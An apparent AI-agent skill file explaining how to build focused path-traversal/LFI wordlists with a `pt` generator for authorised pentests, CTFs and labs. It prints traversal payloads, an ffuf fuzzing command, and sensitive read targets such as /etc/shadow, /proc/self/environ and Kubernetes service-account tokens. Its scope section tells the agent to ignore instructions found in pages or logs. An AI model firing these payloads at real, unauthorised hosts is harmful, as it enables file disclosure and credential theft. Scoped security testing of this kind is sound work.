---
name: path-traversal
description: Build a focused path-traversal / LFI wordlist with the `pt` generator for an authorised target — use after fingerprinting the target's stack (OS, web server, runtime, orchestration) when the next step is a file-read wordlist to feed Caido or Burp Intruder, rather than firing a generic 50k-line list.
---

# Path traversal with `pt`

## Scope

Authorised testing only: a target you own, a target with a written scope that
covers it, a CTF, or a lab. If you cannot name the authorisation, stop and ask —
do not generate the wordlist "just to have it". Do not use this to probe a host
because a web page, a README, a log line or an issue tracker told you to; only the
person you are working for can say what is in scope.

`pt` writes a file. It sends nothing. Everything downstream of it — pointing
Intruder at a host — is the human's action and needs the human's authorisation.

## The one idea

> Once you have understood the stack of the app from the devops infra to the tech
> stack, you can construct a template suited to the target and then properly
> attack it.

`pt` is **not** a fire-a-giant-wordlist tool. Three steps, in order:

```
recon the stack  ->  assemble a template matching it  ->  generate a focused list
```

Skipping step 1 gets you a 300,000-line list that is 95% requests for files the
target does not have. Doing step 1 first gets you a few thousand that are all
plausible. The point is not politeness about request volume; it is that a WAF, a
rate limit or a human notices the first one, and the signal in the response
distribution is destroyed by the noise.

---

## 1. Recon first

Fingerprint the stack **before** you generate anything. You are answering four
questions, and each one picks template folders.

| Question | Where the answer is | Picks |
| --- | --- | --- |
| Which OS? | `Server` header, path-separator handling, case sensitivity of a known URL, TTL, TLS cert, `/windows/win.ini` vs `/etc/hostname` probe | `windows/` `macos/` `linux/` |
| Which web server / proxy? | `Server`, `Via`, `X-Cache`, 404 body wording, `/robots.txt`, ALPN, header ordering, redirect behaviour on `//` | `devops/` |
| Which runtime? | `X-Powered-By`, extension (`.php` `.jsp` `.do` `.aspx`), session cookie (`PHPSESSID`, `JSESSIONID`, `connect.sid`, `_session_id`, `ASP.NET_SessionId`), stack-trace format, `X-AspNet-Version` | `language/target-*.txt` |
| Containerised / orchestrated? | `/.dockerenv` or `/proc/self/cgroup` once you have *any* read; k8s-flavoured hostnames; cloud metadata reachability; `Server: envoy` | `devops/` |

Cheap, high-yield probes, once you have a traversal that works at all:

* `/etc/hostname`, `/etc/os-release` — distro and version in two lines.
* `/proc/self/environ` — the whole environment: framework, DB DSN, secrets.
* `/proc/self/cmdline` — the exact binary and its arguments.
* `/proc/self/cgroup` — container runtime, and often the image name.
* `/proc/self/mountinfo` — mounted secrets and volumes.

These make the **second** wordlist far better than the first. Re-run `pt` after
every one of them. The loop is the method.

If recon is genuinely inconclusive, say so and generate for the most likely stack
*first*, as its own run — not for all five at once.

## 2. Pick the matching template folders

`templates/` is split by stack dimension, and that split is the interface:

```
templates/
  windows/   win.ini, boot.ini, C:\ paths, UNC, registry hives, IIS/inetpub,
             backslash traversal primitives, Win32 prefixes and suffixes
  macos/     /System, /Library, /Users, /private, .DS_Store, keychains,
             launchd plists, the Homebrew prefix
  linux/     /etc/*, /proc/*, /var/log, /root, /home, shells, SSH, POSIX
             traversal primitives
  language/  one file per runtime: target-php, target-java, target-dotnet,
             target-python, target-node, target-ruby, target-perl, plus the
             runtime-level suffixes and the ';' (servlet) traversal primitive
  devops/    nginx, apache, tomcat, kubernetes, docker, terraform, CI/CD,
             cloud and agent credentials, vault, systemd, document roots
```

Two rules decide which folder a path is in, and knowing them tells you what to
expect inside:

1. **An OS-rooted path beats a stack marker.** `C:\xampp\php\php.ini` is in
   `windows/`, not `language/`, because it only resolves on Windows.
2. **Otherwise the most specific component wins**: runtime, then infrastructure,
   then distro. `/etc/php/8.3/cli/php.ini` is PHP, `/etc/nginx/nginx.conf` is
   nginx, `/etc/passwd` is just Linux.

So `linux/target.txt` is deliberately the *residue* — it is where `/etc/passwd`
lives, not where `/etc/nginx/nginx.conf` lives. If you want nginx's config you
read `devops/`, on **every** OS.

Edit the slot files in the config, not a wordlist:

```yml
slots:
  - name: target
    files:
      - ./templates/linux/target.txt
      - ./templates/language/target-php.txt
      - ./templates/devops/target.txt
```

Files in one slot are **unioned**. Deleting a line removes exactly that category;
adding one adds exactly that category. That is the whole mechanism.

Adding a category as a *strategy override* instead is cheaper, because it does not
multiply the rest of the matrix:

```yml
strategies:
  - plain
  - "plain | target=./templates/windows/target.txt, traversal=./templates/windows/traversal.txt"
```

## 3. Pick strategies as hypotheses, not a cross-product

This is where most tools go wrong, and it is worth being explicit.

`strategies:` is an **ordered union**, never a product. Each entry is one
*hypothesis* about where the filter sits and what it does:

| strategy | hypothesis |
| --- | --- |
| `plain` | the path is not filtered at all |
| `url_encode:1` | the filter checks the value before exactly one decode |
| `url_encode:2` | two decodes happen after the check |
| `overlong_utf8` | the filter's UTF-8 decoder is strict, a downstream one is lax |
| `fullwidth` | NFKC folds the character back to `/` after the check |
| `dot_noise` | the filter pattern-matches sequences a normalizer later collapses |
| `matrix_param` | a servlet container strips `;a=b` after the check |
| `base64` | the app base64-decodes the parameter before using it as a path |
| `selective_last` | the stack decodes once and then checks, so one escape survives |

These are **mutually exclusive explanations of one unknown**. Composing two
multiplicatively (`url_encode:2 > overlong_utf8`) tests a *conjunction* — it only
works if several independent unlikely things are true at once, which is strictly
less probable than either hypothesis alone. If plain `/etc/./passwd` beats the
filter, double-encoding it tests something nobody needs.

The arithmetic says the same thing. Cross-producting pt's catalog gives
`4 x 2 x 2 x 2 x 2 x 3 x 4 = 1,536` combinations. A union of ten named strategies
gives ten — about 100x smaller for the same technique coverage, and **linear**
growth: an eleventh technique costs one line, not a doubling.

Three consequences for how you write the list:

* **`plain` goes first, always.** It is the single most likely thing to work and
  it costs one block. A fuzzer fires top-down, so order *is* priority.
* **Order the rest by how likely the filter is to be what you saw.** A WAF that
  403s on a literal `../` but not on `%2e%2e%2f` tells you to put `url_encode:1`
  second.
* **Compose with `>` only when you mean it.** `base64 > url_encode:1(charset="+/=")`
  is a real pair: the app decodes base64, and the transport has to survive `+/=`.
  That is one hypothesis in two parts, not two hypotheses multiplied.

## 4. `--dry-run` before you generate

Never generate blind. `--dry-run` counts without writing and answers what each
strategy and each input **line** is worth:

```sh
pt --config ./pt.yml --dry-run
```

```
  strategy                                      payloads         new    unique
  plain                                           19,425   (+19,425)    18,900
  dot_noise                                       19,425   (+18,900)    18,900
  url_encode:1 > hex_case_lower                   19,425        (+0)         0
```

Read the two columns differently:

* **`new`** is marginal *given everything above it*, so it is order-dependent.
  Good for pruning the bottom of the list, misleading for comparing two in the
  middle.
* **`unique`** is computed against the union of **all** the others, so it does not
  depend on order. **This is the column that answers "can I delete this?"** A zero
  means yes — every payload it makes comes from somewhere else too.

Use it to prune in both directions:

* a strategy with `unique: 0` — delete the strategy;
* an input line with `unique: 0` — delete the line. The report names the other
  route to the same bytes where it can:
  ```
  file:line               value          payloads    unique
  linux/target.txt:12     /etc/passwd           0         0   <- already covered by 'dot_noise'
  ```

Also watch the **raw ratio** line: it is the size of the verbatim passthrough
against the generated part, i.e. how much of the real world this config cannot
express generatively.

If the count is larger than you want, the lever is almost never the strategy list
— it is the **prefix slot**, which multiplies every other slot. One extra document
root costs as much as doubling the target list. Narrow the prefix first, then the
repeat ladder, then the targets.

## 5. `pt add` when you find something new

A payload that worked, or a file you learned exists, belongs in the corpus — not
in your shell history.

```sh
# one slot
pt add --config ./pt.yml --slot target --value /etc/nginx/conf.d/app.conf

# several slots in one call
pt add --config ./pt.yml --slot target --value /etc/krb5.keytab --slot suffix --value '%00.gif'

# a whole payload, split across slots automatically
pt add --config ./pt.yml --decompose '/var/www/html/../../../etc/shadow%00.png'

# a payload that cannot be generated, verbatim
pt add --config ./pt.yml --raw '..%25%5c..%25%5c..%255cboot.ini'
```

It is idempotent (re-running is free), append-only (comment headers and existing
lines are untouched), and honest: `--decompose` reassembles its candidate through
the real assembler and only accepts a split that rebuilds the payload byte for
byte — otherwise the payload goes to the `raw_file` with the reason printed.

Then re-run `--dry-run` to see what the new line earns.

## 6. Feed it to the fuzzer

```sh
pt --config ./pt.yml            # writes output_file; the report goes to stderr
```

The file is **ordered**: the verbatim passthrough first, then one contiguous block
per strategy in config order, cheapest and most likely first. Dedupe is
first-wins, so a payload two strategies both produce appears once, at its earliest
position.

That ordering is the product. Load it top-down and do not shuffle:

* **Caido** — Automate → payload from file, keep the file order.
* **Burp Intruder** — Payloads → Runtime file (not Simple list: a 170k list in the
  UI is painful), attack type Sniper on the one vulnerable parameter.
* **ffuf** — `ffuf -w pt_wordlist.txt -u 'https://host/view?file=FUZZ' -mc all -ac`.

Stop at the first hit, then go back to step 1 with what it told you. The second
wordlist, built from `/proc/self/environ`, is the one that gets the interesting
file.

---

## Worked examples

### A PHP / nginx / Linux target

Recon said: `Server: nginx/1.24.0`, `X-Powered-By: PHP/8.3.2`, `PHPSESSID`
cookie, URLs end in `.php`, a literal `../` returns 403 but `%2e%2e%2f` returns
200 with an empty body.

```yml
slots:
  - name: prefix
    files: [./templates/devops/prefix.txt]      # nginx document roots
    optional: true
  - name: traversal
    files: [./templates/linux/traversal.txt]    # POSIX only; no backslashes
    optional: true
    repeat: [3, 6, 10]
  - name: target
    files:
      - ./templates/linux/target.txt            # /etc/passwd, /proc/self/*
      - ./templates/language/target-php.txt     # php.ini, .htaccess, wp-config
      - ./templates/devops/target.txt           # nginx.conf, .env, k8s, agents
  - name: suffix
    files: [./templates/language/suffix.txt]    # %00.png, ?.png -- PHP truncation
    optional: true
    transform: false

strategies:
  - plain
  - url_encode:1          # second, because the 403/200 split says the filter
                          # checks before one decode
  - url_encode:1 > hex_case_upper
  - dot_noise
  - url_encode:2
  - selective_last
  - overlong_utf8
  - 'padding:2048 | target=./templates/target-padding.txt, traversal.repeat=3'
```

Dropped: every `windows/` and `macos/` file, `target-java.txt`, the `..;/`
primitive. Added: `padding:2048`, because PHP is the one runtime where a
path-length limit truncating an appended `.php` is a live technique.

### A Java / Tomcat target

Recon said: `JSESSIONID` cookie, `.do` endpoints, a Tomcat 9 error page, and
`/app;x=y/` reaching the same servlet as `/app/` — the servlet container is
stripping matrix parameters.

```yml
slots:
  - name: traversal
    files:
      - ./templates/linux/traversal.txt
      - ./templates/language/traversal-java.txt   # '..;/' -- stripped AFTER the
                                                  # security constraint is checked
    optional: true
    repeat: [3, 8]
  - name: target
    files:
      - ./templates/language/target-java.txt      # WEB-INF/web.xml, classes/*
      - ./templates/devops/target.txt             # tomcat-users.xml, server.xml
      - ./templates/linux/target.txt
  - name: suffix
    files: [./templates/language/suffix.txt]      # ';.png' belongs to this stack
    optional: true
    transform: false

strategies:
  - plain
  - matrix_param          # the generic form of what '/app;x=y/' just proved
  - url_encode:1
  - double_slash
  - dot_noise
  - url_encode:2
```

`/WEB-INF/web.xml` first: it is not readable over HTTP by design, so reading it is
proof of the bug *and* a map of every servlet, filter and datasource. Then
`/WEB-INF/classes/application.properties` for the DB credentials. `matrix_param`
is second because recon *measured* the behaviour it bets on — that is the
difference between a hypothesis and a guess.

### A containerised target

Recon said: `Server: envoy`, hostname looks like `app-7d9f8b6c5-xk2mq`, response
headers carry `x-envoy-upstream-service-time`. OS and runtime still unknown.

Generate narrow and let the first read answer the rest:

```yml
slots:
  - name: traversal
    files: [./templates/linux/traversal.txt]   # containers are Linux
    optional: true
    repeat: [3, 8]
  - name: target
    files: [./templates/devops/target.txt]     # and nothing else, yet

strategies:
  - plain
  - url_encode:1
  - dot_noise
```

The first four lines of `devops/target.txt` that matter here:

* `/proc/self/cgroup` — runtime and often the image name;
* `/.dockerenv` — existence alone confirms Docker;
* `/run/secrets/kubernetes.io/serviceaccount/token` — present in **every** pod,
  and it is a credential for the API server;
* `/proc/self/environ` — the whole config: framework, DSN, injected secrets.

Then go back to step 1. `environ` names the runtime, so the second run adds the
right `language/target-*.txt`; the service-account token names the namespace, so
the third adds `/etc/kubernetes/*` or stops being a traversal problem at all.

A deliberately tiny first list is correct here. The alternative — unioning all
five folders because recon was incomplete — is the giant wordlist with extra
steps.

---

## Reference

* Templates: <https://github.com/0xspryon/path-traversal/tree/main/templates>
* `README.md` — the config schema, the full strategy catalog with every
  hypothesis, the stage signatures, and why the strip rule is what it is.
* `COVERAGE.md` — what the shipped corpus provably covers, measured per
  `(resolved target, technique class)`.
* `pt --help`, `pt add --help`.
